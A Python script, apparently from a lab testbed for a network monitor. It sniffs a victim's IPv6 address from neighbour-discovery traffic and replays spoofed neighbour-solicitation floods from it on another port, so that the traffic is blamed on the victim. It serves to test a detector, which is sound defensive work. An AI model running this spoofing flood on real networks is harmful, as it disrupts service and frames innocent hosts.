#!/usr/bin/env python3
"""A3 address-theft replay (PRD S6, threat T4).

A node on the link observes a victim's current (resolvable) address and replays
traffic from it on a DIFFERENT port, within the same epoch, to frame the victim.
This is the attack that FR-D4 ("a resolvable address seen on a second port
within its epoch") is meant to catch. FR-D4 is a P1 detector and is not wired
into the monitor yet, so this script is here for completeness and for when it
is; the flood it generates is still attributed to the victim's pseudonym.

  # replay a known address:
  sudo ip netns exec attacker .venv/bin/python -m attacks.replay \
       --address fd4d:6179:666c:1:1122:3344:5566:7788 --duration 20
  # or sniff one off the link first:
  sudo ip netns exec attacker .venv/bin/python -m attacks.replay --sniff --duration 20
"""

from __future__ import annotations

import argparse
import ipaddress
import sys
from typing import List, Optional

from attacks.common import IFACE, ensure_lab_namespace, hwaddr, run_rate_limited
from attacks.ndp_flood import build_ns

from scapy.config import conf
from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6ND_NS

TARGET = "fd4d:6179:666c:1::1"


def _is_victim_global(addr: str) -> bool:
    try:
        ip = ipaddress.IPv6Address(addr)
    except ValueError:
        return False
    return ip.is_global or (str(ip).startswith("fd") and not ip.is_link_local)


def sniff_address(iface: str, timeout: float, mine: set) -> Optional[str]:
    """Return the first global source address seen in an NS/NA that is not ours."""
    print("sniffing %s for a victim address (%.0fs)..." % (iface, timeout), file=sys.stderr)
    found = {}
    sock = conf.L2listen(iface=iface, filter="icmp6")
    try:
        import time
        end = time.monotonic() + timeout
        while time.monotonic() < end:
            pkt = sock.recv()
            if pkt is None or (ICMPv6ND_NS not in pkt and ICMPv6ND_NA not in pkt):
                continue
            src = pkt.getlayer("IPv6").src if pkt.haslayer("IPv6") else None
            if src and src not in mine and _is_victim_global(src):
                found["src"] = src
                return src
    finally:
        sock.close()
    return found.get("src")


def main(argv: Optional[List[str]] = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("--iface", default=IFACE)
    ap.add_argument("--address", default=None, help="victim address to replay")
    ap.add_argument("--sniff", action="store_true", help="capture a victim address first")
    ap.add_argument("--sniff-timeout", type=float, default=20.0)
    ap.add_argument("--target", default=TARGET)
    ap.add_argument("--rate", type=float, default=100.0)
    ap.add_argument("--duration", type=float, default=20.0)
    args = ap.parse_args(argv)
    ensure_lab_namespace(args.iface)
    mac = hwaddr(args.iface)

    victim = args.address
    if args.sniff and not victim:
        from attacks.common import all_global
        victim = sniff_address(args.iface, args.sniff_timeout, set(all_global(args.iface)))
    if not victim:
        ap.error("no victim address (give --address or use --sniff)")
    if not _is_victim_global(victim):
        ap.error("%r is not a global address" % victim)

    print("replaying victim address %s on %s (its origin port is elsewhere -> address on two ports)"
          % (victim, args.iface), file=sys.stderr)
    batch = max(1, int(args.rate // 10))
    frame = build_ns(victim, args.target, mac)
    run_rate_limited(args.duration, args.rate, lambda now: [frame] * batch, args.iface,
                     batch=batch, label="replay")
    return 0


if __name__ == "__main__":
    sys.exit(main())
